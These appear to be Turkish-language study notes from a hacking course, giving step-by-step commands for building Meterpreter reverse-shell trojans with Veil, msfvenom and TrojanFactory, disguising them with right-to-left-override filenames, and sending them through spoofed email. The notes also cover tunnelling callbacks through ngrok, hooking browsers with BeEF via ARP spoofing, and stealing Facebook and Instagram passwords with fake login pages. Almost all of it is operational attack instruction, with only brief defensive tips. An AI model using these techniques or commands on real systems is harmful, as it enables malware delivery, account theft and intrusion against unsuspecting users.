+tarayıcımıza lokal ip adresimizi yazarak web sitesi olarak yayınlanan /html dizini içerisindeki dosyalarımızı görebiliriz daha sonra
+ .jpeg dosyamızı seçip bu dosyamızın URL sini kopyalayıp -f dosyanın-url-adresi -e trojanimizin-url-adresi -o /opt/TrojanFactory/newtest.exe
+  -i ikonun-url-adresi -e komutu EVIL FILE yani kötü dosya = trojanimiz -o OUTPUT ADRESS yani oluşturduğumuz yeni dosyanın kaydedileceği konum
+   -i parametresi de ikonun url adresinin belirtildiği parametre 
+
+maalesef bu tool hata verdi bunun için manuel olarak değiştirmemiz gerekiyor tool un generic olarak kullandığı iconun yolu olan /opt/TrojanFactory/icons dizinine gidiyoruz 
+.ico dosyamızı bu klasöre kopyalayıp yapıştırıyoruz generic.ico yu siliyoruz onun yerine bizim .ico uzantılı dosyamızın ismini generic.ico olarak değiştirelim 
+-f dosyanın-url-adresi -e trojanimizin-url-adresi -o /opt/TrojanFactory/newtest.exe -i ikonun-url-adresi 
+ -e komutu EVIL FILE yani kötü dosya = trojanimiz -o OUTPUT ADRESS yani oluşturduğumuz yeni dosyanın kaydedileceği konum -i parametresi de ikonun url adresinin belirtildiği parametre  komutunu kullanıyoruz ve yeniden 
+ değiştirmeyi deniyoruz ardından TrojanFactory/ yolundaki newtest.exe yi kesip var/www/html/backdoors/ dizinine atıyoruz daha sonra
+  aynı ağda bulunan windows sanal makinemizin tarayıcısından kalinin lokal ip sini girerek yayınladığımız websitesinden 
+  .exe dosyamızı indireceğiz 10.0.2.4/backdoors yazıyoruz adres çubuğuna ve indiriyoruz gördüğümüz gibi iconumuz başarıyla değiştirilmiş durumda 
+  (kali de değiştirilmemiş gibi gözükmüştü) daha sonra kaliye gelip msfconsole yazıyoruz use/exploit/multi/handler yazıyoruz entera basıyoruz 
+ set payload windows/meterpreter/reverse_tcp > show options > set lhost 10.0.2.4 > exploit -j -z yazıyoruz şuan tcp portunu dinleme halindeyiz
+  eğer bir bağlantı gelirse bu bize düşecek daha sonra windows a gelip newtest.exe yi açıyoruz
+   ve kaliye döndüğümüzde meterpreter sessions umuzun açıldığını görüyoruz entera basıyoruz  sessions -l yapınca oturumları listeliyecektir 
+ sessions -1 yaparsak listedeki 1. sessions a girecektir ve ardından da ls çalıştırdığımızda windows u hacklemeyi başardık daha sonra
+  exit > exit diyerek buradan çıkabiliriz ancak dosyayı indirdikten sonra .exe olarak gözükme problemi var hedef e daha inandırıcı olması için 
+  bunu değiştirmemiz gerekiyor 
+
+ bu dersimizde dosyamızın uzantısını nasıl değşitireibliriz bunu öğreneceğiz kali de terminale apt-get install gnome-characters yazıyoruz 
+ ardından sol üstteki arama kısmına gelip Characters diye aratırsak 
+ az önce yüklemiş olduğumuz uygulama çıkacak buna giriyoruz bu programdaki arama yerine right-to yazıyoruz ardından çıkan sonuçlardan 
+ Right-to-left-Override seçeneğine tıklayıp açılan pencerede Copy Charactere tıklıyoruz apt-get install geddit ve apt-get install leafpad
+  komutunu kullanarak bu iki text editörü yüklüyoruz bu kopyaladığımız character ise şu işe yarıyor 
+  örneğin adrogpj.exe uzantılı bir dosyamız var bu dosyamızın gpj.exe kısmını (veya nereyi seçersek) sağdan sola doğru sırayla karakterlerini
+   değiştiriyor ve androexe.jpg yapıyor hedef kullanıcımız da bunun bir jpeg yani resim dosyası olduğunu düşünüyor 
+ ardından newtest.exe dosyamın olduğu /backdoors dizinine gidip bu dosyama sağ tık yapıp yeniden adlandır veya rename diyerek 
+ dosyamın ismini adrogpj.exe yapıyorum ve gpj.exe kısmını seçip kopyaladığım bu tersine çevirme karakterini yapıştırıyorum 
+ eğer bir değiştirme olmadıysa ve yapıştırdıktan sonra andro yazıyorsa sadece gpj.exe yazıyorum ve gp.exe yazmama rağmen exe.jpg olarak 
+ göründüğünü görüyorum ardından rename diyerek dosyamın ismini istediğim şekilde güncelliyorum 
+
+ bu dersimizde oluşturduğumuz ve uzantısını değiştirdiğimiz dosyamızı mail yoluyla ve başkasından geliyor gibi örneğin uygulamamız için 
+ admin@udemy.com mail adresidnen geliyor gibi göndermek için bazı anonymous e mail sender sitelerini kullanacağız 
+ http://www.sendanonymousemail.net/ örneğin bu sitede Receiver's email: kısmına gönderilecek mail adresi 
+ Sender's email: gönderenin mail adresi (admin@udemy.com) subject = about android course / hemen aşağısındaki bölüme de
+  zararlı dosyamızın yayınlanmış olduğu url yi yapıştırıyoruz ve gönderiyoruz https://www.5ymail.com/ bu adresten de deneyebiliriz
+ bazen de hackerlar mail ile göndermek yerine upload sitelerine upload edip hedefe indirtirler bazı upload siteleri 
+ .exe yüklenmesine izin vermezler bu yüzden zipleyip o şekilde siteye yüklerler böylece bu güvenlik önlemini de atlatmış olurlar 
+ backdoor oluşturma ve .exe uzantılı dosyaların iconunu dğeiştirmwk için kullanaiblecğeimiz 
+ bir başka tool da https://github.com/AzizKpln/Social_X adresinden indirebiliriz 
+
+ bu dersimizde beef aracının ne olduğunu öğreneceğiz beef The Browser Exploitation Framework anlamına gelir 
+ yani tarayıcıları sömürme aracıdır hackerlar bu framework ü kullanarak hedef cihazın tarayıcısında bazı zararlı javascript kodları 
+ çalıştırıyorlar beef i çalıştırmak için kalide programları aradığımız yere gidip beef yazıyoruz ve çıkan sonuçalrdan 
+ beef start a tıklıyoruz eğer ilk defa açıyorsak bize dafault şifrenin beef olduğunu söylüyor ve dğeiştirmemiz 
+ gerektiğini söyleyecektir beef yazıp entera basıyoruz şifreyi yazdıktan sonra biraz bekledikten sonra bize beef in websitesini açacaktır 
+ burada kullanıcı adına beef şifreye de beef yazıp giriş yapıyoruz 
+ terminalden beef dışında bir şifre de belirleyebiliriz terminale hangi şifreyi yazdıysak websitesinden de o şifre ile giriş yapıyoruz 
+ beef de oltaya takmak anlamında hook kelimesi kullanılır 
+ hedefimizin cihazını bir defa hackledikten sonra sol tarafta eğer online ise online kısımda offline ise offline kısımda görünecektir 
+ eğer beef kali linux da hazır olarak yüklü gelmezee kendimiz yüklememiz gerekiyor ömcelikle terminali açıyoruz
+  ve beef i hangi dizine yüklemek istiyorsak oraya gidiyoruz cd /opt/ dizinine gidiyoruz git clone https://github.com/beefproject/beef 
+  yazıp entera basıyoruz yükleme bittikten sonra cd beef diyoruz ardından bir defaya mahsus ./install dosyasını çalıştırıyoruz 
+  ardından Y ye basıp enterlıyoruz ardından aynı konumdayken ./beef yazıp enterlıyoruz error default username and password in use 
+  hatası alırsak nano config.yaml yazıyoruz bu hatayı vermesinin sebebi beef i default kullanıcı adı ve şifre ile kullanıyor olmamız bu yüzden
+   nano ile yaml dosyasını açıp ok tuşuyla aşağı inip credentials başlığının altındaki user ve passwd ı değiştirmemiz gerekiyor 
+   " " işaretlerinin arasına şifre ve kullanıcı adımızı yazıp 
+ ctrl+o entera basıyoruz ctrl + x ile çıkıyoruz ./beef yazarak tekrar çalıştırıyoruz beef i başlattıktan sonra genellikle
+  mozilla ile beef in sitesi açılacaktır ama açılmaz ise terminale yazıdrılan çıktılar arasında UI URL 127.0.0.1 lokal dresimizin bulunduğu 
+  satıurı kopyalayıp tarayıcımıza yapıştırıyoruz bir önceki derste olduğu gibi bir arayüz ekranı bizi karşılayacaktır
+   nano ile açıp değişiklik yaptığımız kullanıcı ve şifre ile buraya girişimizi yapıyoruz 
+ bu dersimizde beef i ağ içi saldırılarda deneyeceğiz şimdi bizim hedef cihazımızı oltaya takmak (hook etmek) için bir websitesi oluşturmamız
+  lazım bu websitesi içine Hook: satırındaki kodu koymamız laızm 
+ web serverımızı yayına açmak için de apache servisini kullanacağız apache ile kali linuxumuzu bir web server gibi kullanaibliyoruz
+ bunu yapmak için service apache2 start diyoruz daha sonra arayüzden var/www/html/index.html dosyasını sağ tıklayıp bir test editör ile açıyoruz 
+ buradaki tüm kodları ctrl+a yapıp siliyoruz beef i çalıştırdığımızda yazdırılan Web UI > Hook > Example başlıklarından Example satırındaki
+  <script> ile başlayan kodu kopyalıyoruz 
+
+ <h1> i hack you </h1> 
+
+ kısmının altına bu kodumuzu yapıştırıyoruz. buradaki yer alan ip adresini bizim ip adresimiz ile değiştiriyoruz
+(windows un değil kali linux un ip adresi!!)
+ daha sonra windows makinemizden apache ile yayınladığımız ip adresi üzerinden sitemize erişmeye çalışıyoruz 
+ tarayıcının adres çubuğuna ip yazarak örn : 10.0.2.9 gibi daha sonra kali linux dan beef in sitesini açtığımızda 
+ online kısmında hook ladığımız yani oltaya taktığımızı görüyor olacağız windows makinemizin browserını 
+ peki aynı ağda bulunduğumuz iç ağımızdaki hedef cihaza nasıl göndereceğiz bu linki bunun için bettercap aracını kullanacağız 
+ kaliden terminale gelip bettercap iface eth0 yazıp enterlıyoruz daha sonra caplets.show yazarsak 
+ bize bettercap ile birlikte çalştırabileceğimiz hazır kodları ve payloadları görebiliriz biz bu capletsler arasından 
+ beef.custom ı kullanacağız ama bizim sistemimizde hazır gelemdiği için 106. ders js enjeksiyonunun kaynaklar bölümünden 
+ bu dosyayı indiriyoruz daha sonra arayüzden usr/share/bettercap/caplets/beefcustom indirdiğimiz dosyayı zipden çıkartıp 
+ bu klasörün içerisine koymamız yeterli olacaktır bu yoldaki beffcustom.cap i açıyoruz set arp.spoof.targets 10.0.2.4 
+ (bu kısma windows makinemizin ipsini yazıyoruz)
+ ardından beef.js dosyasını bir text editör ile açıyoruz </head> etiketinin hemen altında <script type "text/javascript" src ile başlayn
+  satırdaki ip adresini kali linux umuzun ip adresini yazarak değiştiriyoruz ardından dosyauı kaydedip kapatıyoruz
+ ardından terminale gelip bettercap i baştan çalıştırıyoruz bettercap iface eth0 -caplet  usr/share/bettercap/caplets/beefcustom/beef.cap 
+ daha sonra entera basıyoruz ve işlemleri başlatıyoruz 
+ bu işlem hedef cihaz sadece http sitelere girerse çalışacaktır çünkü hsts için ayarlamadık bu uygulamada 
+ eğer bu işlemi yaparken bir hata alırsak mitmf ile de yapabiliriz 
+
+ bunun için de kullanacağımız komut
+  python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0 --inject --js-url http://10.0.2.8:3000 /hook.js 
+ kali cihazımıza gelip tarayıcıdan beef i açıyoruz ve sağ tarafta bazı tabler olduğunu görüyoruz bunlar arasında 
+ Logs kısmında hedef cihazımız hangi sitelere girmiş bunu görebiliriz 
+ Commands kısmından hedef cihazımızın tarayıcısında hangi komutları çalıştırabileceğimizi görebiliriz 
+ burada yeşilden kırmızıya doğru sıralanmış komutlar bu yeşil olanların çalıştırılma ihtimalinin yüksek olduğunu,
+  kırmızıya doğru ise çalıştırılma ihtimalinin düştüğü anlamına gelir örneğin WebCam HTML5 kodunda hedef cihazımızın webcamini açarız 
+ Spider Eye komutu da hedef cihazımızın tarayıcısından bir ekran görüntüsü almak için kullanılır 
+ sağ alttaki execute butonuna bsarsak hedef cihazın o anki ekran görüntüsünü alacaktır 
+ Create Alert Dialog komutunu kullanarak da hedef ciazın tarayıcısında bir uyarı mesajı çıkartabiliriz 
+ buradaki input kısmına istediğimiz mesajı girerek  sağ alttan execute diyip işlemi gerçekleştirebiliriz 
+
+ bu dersimizde hackerların beef kullanarak facebok şifrelerini nasıl çaldığını öğreneceğiz 
+
+ beefde commands tabında social engineering başlığında pretty theft isimli bir komutumuz var
+  dialog type dan facebook u seçiyoruz backing kısmınada dray i seçiyoruz 
+ hemen bir altındaki kısımdan da logo verebiliyoruz ama bu uygulamada default logoyu kullanacağız 
+ sağ alttan execute a basıyoruz bu uygulamada execute ettikten sonra
+ hedef cihazın browserında aniden bir facebook username ve password inputları çıkar ve 
+kullanıcıya oturumunuzun süresi dolmuştur lütfen kullanıcı adınızı ve şifrenizi yazıp yeniden giriş yapın mesajı çıkar
+ hedef de bu girişi yaparsa facebook kullanıcı adı ve şifresi saldırganın eline geçmiş olur 
+ beefden, module result history > command result kısmından bu kullanıcı adı ve şifreyi görebilir 
+social engineering kısmının altında fake notification bar (chrome) u seçiyoruz bu komutu execute edince hedef bilgisayarın browserında
+ bu siteyi gezebilmek için bazı eklentileri indirmeniz gerekiyor gibi bir uyarı çıkar biz istersek buradaki inputu değiştirip
+güvenlik güncellemeniz geldi lütfen indirin vs bir şey yazabiliriz (notification text),kısmındaki input url'de de hedefe indirteceğimiz 
+backdoorun url sini yazacağız tabii ki bunun için bir backdoor dosyası oluşturmamız gerekiyor.bunun için Veil toolunu kullanacağız 
+cd /opt/Veil yazıyoruz terminalde python3 Veil.py yazıyoruz use 1 > list > use 14 > set lhost 10.0.2.8 (kalinin ipsini yazıyoruz)
+ardından set lport 4040 (daha önce 8080 kullanmıştık beef 8080 i kullandığı için bir çakışma olabilir bunu engellemek için boşta olan 
+5050 portunu kullanıyoruz/4040 da yapabiliriz) set processors 1 > set sleep 3 > generate işlemlerini sırayla takip ediyoruz 
+daha sonra paylaoadımıza bir isim vereceğiz install_plugin diyoruz backdoor oluşturulduktan sonra executable written to satırından 
+dosyanın nereye oluşturulduğunu öğreniyoruz bu dosyayı apache serverımıza yükleyeceğiz service apache 2 start diyerek
+apache hizmetini başlatıyoruz daha sonra klasör arayüzünden /var/lib/veil/output/compiled/ dizinine gidiyoruz 
+install_plugin.exe dosyasını alıp /var/www/html/ dizinine taşıyoruz bu dosyayı. 
+ardından terminle msfconsole yazıyoruz msf çalıştırılırken beef e gelip url kısmına dosyanın indirileceği url yi kopyalıyoruz 
+başında http:// olması gerekiyor sonu da /install_plugin.exe olarak bitmesi gerekiyor 
+sağ alttan execute yapıp windows sanal makinemize girip sahte bildirim barının geldiğini görebiliriz 
+sağ üstten install missing plugins.. butonuna basıp dosyayı indiriyoruz ama çalıştırmıyoruz çünkü önce msfconsole dan 
+multi-handler özelliğini çalıştırmamız gerekiyor kaliye gelip msfconsole terminaline geliyoruz use/exploit/multi/handler yazıp
+  enterlıyoruz mutli handler ı kulanarak gelen bağlantıları dinleyebiliyoruz netcat gibi daha sonra multi handler çalıştıktan sonra 
+  msfconsoledayken set payload windows/meterpreter/reverse_http yazıp enterlıyoruz 
+(burada sçeilen payload backdoor dosyası oluştururken kullandığımız) payload türüyle aynı olmasına dikkat ediyoruz daha sonra options diyip
+ enterlıyoruz set lhost 10.0.2.8 yazıp enterlıyoruz set lport 4040 diyip enterlıyoruz ardından son olarak exploit yazıp enterlıyoruz
+  eğer sadece exploit işe yaramazsa exploit -j -z yi deneyebilriz bu komut exploiti arka planda çalıştırmaya yarar 
+daha sonra windowsumuza indirdiğimiz exe dosyasını çalıştırıyoruz kali linux msfconsole geldiğimizde session un açıldığını
+ bağlantının kurulduğunu görüyoruz bize tanıdığımız birinden bir dosya gelirse dosyanın ismini değiştir diyerek
+  left to right karakteri kullanılmış mı bunu görebiliriz 
+diğer yandan arp saldırısına maruz kalıp kalmadığımızı anlamak için de apr -a komutunu kullanıp ağda aynı mac adresine sahip 2 cihaz var mı
+ bunu görebiliriz bu dersimizde phising instagram ile ilgili bir uygulama öğreneceğiz bunun için 113. dersin kaynakların bölümündeki dosyayı
+  indiriyoruz bu .zip uzantılı dosyayı arşivden çıkartıyoruz bu klasörde 2 adet dosya var bizisi .html uzantılı bir dosya diğeri de
+   .php uzantılı bir dosya .html uzantılı dosya hedef cihazın yönlendirileceği sanki gerçekten instagrama gitmiş gibi 
+gözüken bir klon login ekrnaıdır hedef kişinin buraya username ve şifresini girmesi istenir .php uzantılı dosyada ise kullanıcının 
+bu inputlara girmiş olduğu username ve password bilgileri bir dosyaya kaydedilir ve daha sonra bize gönderilir ve
+ daha sonra username ve şifresini giren kullanıcı gerçek instagram sitesine yönlendirilir sanki hiç bir şey olmamış gibi 
+böylece bir şüphe de oluşmaz hedef kullanıcıda şifreyi de password.html dosyasına kaydeder bu php kodları bu uygulama local ağda çalışmıyor
+ o yüzden apache hizmeti kullanmamız bir işe yaramayacaktır o yüzden bir websitesi kurmamız gerekiyor bunun için 000webhost.com sitesini 
+ kullanabiliriz buraya kayıt olunca ücretsiz bir domain alabiliyoruz 
+ardından bu siteye kayıt olduğumuz e mail adresimize gelen bir verification kodu ile hesabımızı doğruluyoruz ardından sitemizin olduğu url ye
+ giriyoruz manage website diyoruz indirdiğimiz phising dosyasındaki .html ve .php dosyalarını sitemize yüklemek için yukarıdaki tab lardan
+  file manager a geliyoruz aşağıdaki kırmızı upload files now butonuna basıyoruz açılan sayfada sol taraftan public_html dizinine gidiyoruz 
+  sağ üstteki dosya yükleme ile ilgili olan ikonu seçiyoruz buradan 2 dosyamızı da seçip sitemize yüklüyoruz 
+seçtikten sonra kırmızı upload tuşuna basıyoruz ardından oluşturduğumuz sitemize tekrar giriş yaptığımızda kendi sahte instagram klon giriş
+ sayfamızı oluşturduğumuz görüyoruz username test password test123 diyoruz ve bizi instagramın kendi sitesine yönlendirecek tekrar geri gelip
+  sitemizin sonuna /password.html yazdığımızda hedef kişinin login olurken kullandığı username ve şifreyi görebiliriz işlemimiz başarıyla
+   gerçekleşti  
+
+port forwarding port yönlendirme işlemi örneğin veil den bir backdoor oluşturduk bu backdoor hedef cihazda çalıştırıldı 
+ve biz kendi public ip mizi yazdığımız için bizim pc mize bağlanacak ama bu işlemden önce bu bağlantı isteği modeme geliyor
+ biz modeme xxx portuna bir bağlantı isteği gelirse bu bağlantı isteğini benim ip me yönlendir talimatını veriyoruz 
+ işte bu yönlendirme işlemine port forwarding denir 
+
+bu dersimizde tunneling service ın ne olduğunu ve nasıl kullanıldığını öğreneceğiz kali linux umuzu açıyoruz 
+tünel servisleri bizim kendi cihazımızda çalıştırdığımız servislerdir 
+örneğin localde apache service ile yayına açtığımız sunucuyu public olarak internete yayınlayabiliriz/açabiliriz 
+bu kullanım amaçlarından bir tanesi bizim ise bu uygulamada kullanma amacımız dış ağa yapacağımız saldırılarda tunnel servisini 
+bir aracı olarak kullanmak ve public ip mizi vermeden seçeceğimiz tunnel hizmeti sağlayan site üzerinden bağlantılarımızı almak 
+kurban cihaz tarafından gelen bağlantıyı tunnel servisi üzerinden bize iletmesini sağlamak bunun için https://ngrok.com/ sitesini kullanacağız
+ ve bir üyelik açmamız gerekiyor hesabımızı açıp giriş yaptıktan sonra bu siteyi linux da açtığımız için download for linux 
+diye bir indirme butonu çıkacak buna tıklayıp ilgili dosyayı indiriyoruz bir adet .zip uzantılı bir dosya indirilecek indirilen dosyaya 
+sağ tıklayıp extract here diyerek buraya çıkartma işlemini yapıyoruz dilersek dosyaya çift tıklayıp açılan pencereden dosyayı 
+downloads a sürükleyip bırakarak da arşivden çıkartabiliriz ardından terminalimizi açıyoruz cd Downloads/ diyerek downloads klasörüne gidiyoruz
+ ardından tarayıcımıza geliyoruz ve ngrok hesabımızı açtığımız pencerede aşağı kısımda connect your acoount başlığı altında bir token 
+ olduğunu görüyoruz ./ngrok ile başlayan bir komut bunu kopyalayıp kalide terminalimize yapıştırıp entera basıyoruz bu bir doğrulama kodu 
+her hesaba özgü farklı doğrulama kodu var bu komutu yazınca bu doğrulama kodu ngrok dosyasının içerisine bir defaya mahsus olarak kaydedilir 
+bizim yapmak istediğimiz hizmet biz burada bir servis başlatmak istiyoruz ve servis sürekli açık olacak bu servisin portuna bir bilgi geldiği
+ zaman biz bu bilgiyi/bağlantıyı alıp dinleyebilmek için bu hizmeti kullanacağız bunu yapmak için de ./ngrok tcp 4242 yazıp enterlıyoruz
+  (buradaki port numarası çok önemli değil; 8080,5050,4040) normalde çok kullanılmayan portları deneyebiliriz
+   ancak 80 portunu kullanmamamız lazım çünkü o web servisi portudur bu komutu yazdıktan sonra açılan pencerede Forwarding bölümünde 
+tcp:// ile başlayan satırda ngrok kendi sunucularında bizim için bir port açmış ve buraya gelen bağlantıları bize yönlendireceğini söylüyor 
+backdoor dinleme süreci boyunca ngrok un çalıştığı terminali kapatmamamız gerekiyor new tab e basıp yeni bir sekme açıyoruz terminalde 
+veil da güncel olarak tunnel servisleri blocklanmış durumda bu yüzden veil isminde bir tool kullanacağız 
+msfvenom, veil e göre windows makinalarda oluşturduğu backdoor un yakalanma olasılığı daha düşüktür 
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows lhost=0.tcp.ngrok.io lport=11620 -f exe -o /root/newbackdoor 
+diyip enterlıyoruz buradaki -p , parametreyi belirtmek için kullanılır msfvenom da uzun parametre isimlerinde çift -- tek karakterli veya 
+kısa parametrelerde tek - kullanılır lhost olarak normalde cihazımızın public ip adresini girebiliriz eğer modemden yönlendirme yapacaksak 
+whatismyip diye aratıp oradaki ip yi deneyebiliriz ama bu uygulamada ngrok 
+servisinin bizim için oluşturduğu ip adresini gireceğiz ngrok un çalıştığı terminal sekmesine gelip forwarding satırındaki değeri yazacağız 
+lport da yine ngrok un çalıştığı terminalde forwarding satırının sonlarına doğru .io dan sonra : karakterinden sonra belirtilen port değeridir 
+: dan sonraki public sunucu için olan port numarası --> dan sonrası da local ağımızdaki port numarasıdır 
+-o dan sonraki konum .exe nin nereye kaydedileceğini belirrttiğimiz yoldur daha sonra /root içerisine oluşturulan exe dosyamızı 
+/var/www/html klasörümüze taşıyoruz birazdan kolaylık olacağı için şimdi ise backdoorumuza belirtiğimiz portu dinleme moduna almak için
+ terminale msfconsole yazıyoruz ardından use exploit/multi/handler diyoruz daha sonra set PAYLOAD windows/meterpreter/revere_tcp diyip 
+ enterlıyoruz show options > set LHOST 0.0.0.0 diyip enterlıyoruz > set LPORT 4242 
+ (buradaki 4242 ngrok un çalıştığı terminaldeki forward satırındaki en son sayısal değerdir --> (localhost kısmından sonraki değer) 
+ eğer bu port çalışmaz ise ngrok u baştan başlatıp yine local host kısmında bize verilen yeni portu deneyebiliriz 
+ en son olarak exploit -j -z yaparak dinlemeyi başlatıyoruz daha sonra windows makinemize dönüyoruz ardından kaliye dönüp terminalde
+  service apache2 start yazıp enterlıyoruz windows makinemize dönüp kalimizin local ip sini tarayıcımıza yazıyoruz /exe-nin-buşundugu-konum 
+  u yazıyoruz url ye oluşturduğumuz exe nin üstüne tıklayıp indiriyoruz çalıştırıyoruz dosyamızı ve tekrar kali linuz a döndüğümüz 
+zaman msfconsole bir bağlantı geldiğini görüyoruz entera basıp sessions -l yazıp enterladığımızda girdiğimiz sistemdeki oturumlar ve
+ idleri yazar burada açık olan session un id sini yaparak girebiliriz örneğin id si 2 olsun sessions -2 yaparsak o session a bağlantı yapmış
+  oluruz (-2 yapınca olmadı -1 yapıp dene bazen böyle buglar olabiliyormuş) sysinfo komutunu çalıştırdığımızda giriş yapmış olduğumuz 
+  sistem hakkında bilgi elde edebiliriz örneğin hangi işletim sistemi olduğu çıkar (OS --> satırında) 
+
+dir komutunu çalıştırdığımızda şuan içerisinde bulunduğu klasörü bizim için bastırır linuxdaki pwd komutu gibi 
+bu dersimizde veil kullanarak ngrok servisinden nasıl faydalanabiliriz bunu öğreneceğiz ngrok un çalıştığını varsayarak uygulamdaki işlemleri 
+yazacağım!! cd /opt yaparak bu dizine gidiyorum terminalde cd Veil/ yazarak içerisine giriyoruz python3 Veil.py yazıp 
+veil ı çalıştırıyoruz use 1 > list > use 7 > set LHOST 0.tcp.ngrok.io ve enterladığımızda büyük ihtimalle 
+you did not provide a valid ip hatası alırız bunu düxeltmek için /opt/Veil/tools/evasion/tool.py dosyasında bizim ngrok tarzı bir servis in 
+ip adresini kullandığımız zaman tool tarafından engelleneceğimizi içeren bir python kodu var bunu bypass etmemiz gerekiyor 
+bu dosyaya sağ tıklayıp copy diyip /root un altına yapıştırabiliriz kopyalamamızın sebebi de yedeğini alarak asıl dosya üzerinde değil de
+her ihtimale karşı yedeği üzerinde bir işlem yapmak ve eğer yanlış bir işlem yaparsak asıl dosya değişmeden durduğu için 
+kaldığımız yerden devam etmek için bir önlem kopyaladığımız dosyaya sağ tık yapıp geany ile açıyoruz ctrl+f yapıp 
+aldığımız hata mesajını aratıyoruz bu uygulamada 423. satırda gözüküyor 421. satır else den 424. satıra kadar olan print() dahil 
+424 . satırın tamamını siliyoruz ardından 419. satırdaki if helpers.validate_ip satırındaki if ile 420. satırdaki 
+selected i aynı hizaya getiriyoruz (if in i si ile selected in s si aynı hizada olacak python un girinti kuralından dolayı)
+ardından 419. satırdaki if ile başlayan bütün değeri silebiliriz güncel hali olarak 418. satırdaki e harfi ile 419. satırdaki s harfi
+ aynı hizada olması gerekiyor ardından dosyamızı kaydediyoruz ardından veil in açık olduğu terminale gelip 
+ set LHOST 0.tcp.ngrok.io komutunu yazıyoruz ve hiç bir hata almadık komut çalıştı ardından set LPORT 11620 yazıp enterlıyoruz 
+ (ngrokdaki sol daki port numarası) değişiklerimiz kaydedildi mi bunu görmek için options yazıp enterlıyoruz ve doğruluyoruz 
+ardından generate diyip backdoorumuzu oluşturuyoruz veilback ismini veriyoruz backdoorumuza  entera basıyoruz ve bizim için oluşturuldu 
+backdoorumuzun oluşturulduğu konum /var/lib/veil/output/compiled/veilback.exe bu konumdaki exemizi sağ tıklayıp kes diyoruz 
+var/www/html dizinine atıyoruz ardından veildan exit komutunu yazarak çıkıyoruz ve msfconsole komutunu çalıştırıyoruz 
+use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp > show options > set LHOST 0.0.0.0 > set LPORT 4242 
+(ngrok da en sonda yazan) > exploit -j -z yazıp enterlıyoruz windows makinemize gelip tarayıcıya
+ kalinin-local-ip-si/var/www/html/veilback.exe yi indiriyoruz çift tıklayıp çalıştırıyoruz kaliye msfconsole dönüyoruz bağlantımız kuruldu
+  enterlıyoruz sessions -l yazıyoruz > sessions -1 yazıp bağlanıyoruz 
+
+bu dersimizde post forwarding ile dış ağ backdoor konusunu öğreneceğiz 
+wifi adaptörümüzü taktık ve wlan0 ağ kartını kullanıyoruz 
+cd /opt/Veil > python3 Veil.py yazıyoruz list > use 1 > use 9 > set SLEEP 3 > set PROCESSORS 1 > set LHOST public-ip-miz 
+ardından generate yazıyoruz backdoorumuza bir isim veriyoruz /var/lib/veil/output/compiled konumuna oluşturacak backdoorumuzu 
+/var/www/html/ dizinine taşıyoruz trojanimizı ardından yeni bir terminal tabında msfconsole u çalıştırıyoruz trojan oluştururken
+ yani veil de back door oluştururken lhost a public ipyimizi trojanı dinlerken de lhost kısmına lokal ip mizi yazıyoruz 
+use exploit/multi/handler > set PAYLOAD windows/meterpreter/reverse_http > options > (buradaki lport u değiştirmiyoruz) set LHOST 
+(ifconfig den kalinin lokal ip sini yazıyoruz) ardından son olarak exploit diyip dinlemeye başlıyoruz daha sonra tarayıcımızı açıyoruz 
+ve modemimizin lokal ip sini yazıyoruz büyük ihtimalle 192.168.1.1 dir yazınca modemimizin konfigrasyon arayüzü geliyor
+ buraya kullanıcı adımızı ve şifremizi yazıp giriş yapıyoruz  giriş yaptıktan sonra port forwarding eğer arayüz türkçe ise kapı iletme 
+port iletme veya ip forwarding gibi isme sahip olan sekmeye tıklıyoruz buradaki ayarlardan external start port u 8080 
+external end port u da 8080 yapıyoruz protocol TCP olmalı
+ internal host kalinin lokal ip si internal port da 8080 mapping name e de test yapıyoruz submit yapıyoruz ardından
+ windows makinamızdan tarayıcıdan adres çubuğuna kalinin lokal ip adresini yazıyoruz (tabii ki apache2 servisini açıyoruz önce) daha sonra 
+ en son oluşturmuş olduğumuz trojani indirip çalıştırıyoruz çalıştırınca msfconssole dan session umuzun açıldığını görebiliriz
+
+bu dersimizde dış ağda beef saldırısı nasıl uygulanır bunu öğreneceğiz 
+
+https://www.digitalocean.com/?refcode=30c7a0ab06b6 öncelikle kendimize bir digital ocean hesabı açıyoruz 
+https://m.do.co/c/5ecb7c546723 bu link i adres çubuğuna yapıştırıp bu link ile kayıt olursak davet kodu ile geldiğimiz için
+ normalde ücretli olan hizmeti ücretsiz bir şekilde kullanabiliriz 
+kredi kartı ilgilerimizi girdikten sonra  enter project name kısmına Game Web Server yazıyoruz 
+what is your project for kısmını just trying out digitalocean ı seçiyoruz tell us which tools and technologies you plan to use on digital ocean
+ kısmında PHP yi seçiyoruz start a basıyoruz 
+açılan sayfada Create a Droplet kısmına tıklıyoruz burada hangi sunucu ile çalışmak istiyorsak onu seçeceğiz burada
+ ubuntu yu seçiyoruz boyut olarak da 1 GB ı seçiyoruz 
+
+aşağıda choose a datacenter region kısmında Amsterdam ı seçiyoruz select addiontal options kısmında hiç biri seçili olmayacak 
+son olarak aşağıda yeşil butondaki create a basarak yeni sunucumuzu oluşturuyoruz daha sonra DO a kayıt olduğumuz email e sunucumuzun 
+kullanıcı adı ve şifresi gelecek bunları kullanarak sunucumuza bağlanacağız bu mailde sunucumuzun ip adresi username ve şifre veriliyor 
+eğer şifremiz maile gelmezse do da hesabımıza tıklayıp access kısmında reset root password kısmından şifremizi resetleyebiliriz 
+sunucumuza ssh olarak kali cihazımızdan bağlanabiliriz bunu yapmak için kali terminaline gelip ssh root@sunucunun-ip-adresi yazıp enterlıyoruz
+ardından bize bir şifre soracak maildeki şifreyi girip sunucumuza giriş yapabiliriz yapıştırınca şifremiz gözükmez güvenlik önlemi olarak
+ ama yapıştırılmıştır enterlayıp girebiliriz daha sonra bir kez daha şifremizi sorup yeni bir şifre oluşturmamızı isteyecek oluşturuyoruz 
+artık do daki sunucumuza eriştik username -a yaparsak kullandığımız sistem ile ilgili bize bazı bilgiler verecektir 
+ardından apt-get apache2 yazarak apache servisini yüklüyoruz ardından service apache2 start yapıp apache hizmetini çalıştırıyoruz 
+ardından ifconfig yapıyoruz ve inet  satırındaki ip adresini tarayıcı adres çubuğumuza yapıştırıyoruz 
+eğer apache2 ubuntu default page sayfası gelirse apache2 servisi başarıyla çalışırılmış demektir ardından rm index.html yazarak 
+bu dosyayı siliyoruz(tabii önce cd /var/www/html dizinine gidiyoruz) git clone https://github.com/atilsamancioglu/2048 yazıp enterlıyoruz 
